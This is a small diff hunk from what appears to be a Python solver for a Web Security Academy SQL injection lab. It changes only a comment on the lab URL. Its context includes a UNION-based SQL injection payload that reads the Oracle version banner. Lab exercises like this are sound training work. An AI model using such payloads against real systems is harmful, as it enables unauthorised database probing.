@@ -20,7 +20,7 @@ from colorama import Fore
 #########
 # Main
 #########
-url = "https://0a41002c0389dabc8435a10200330064.web-security-academy.net" # change this url to your lab
+url = "https://0a41002c0389dabc8435a10200330064.web-security-academy.net" # change this to your lab URL
 try:
     # payload to return the database banner
     payload = "' UNION SELECT banner, null FROM v$version-- -"
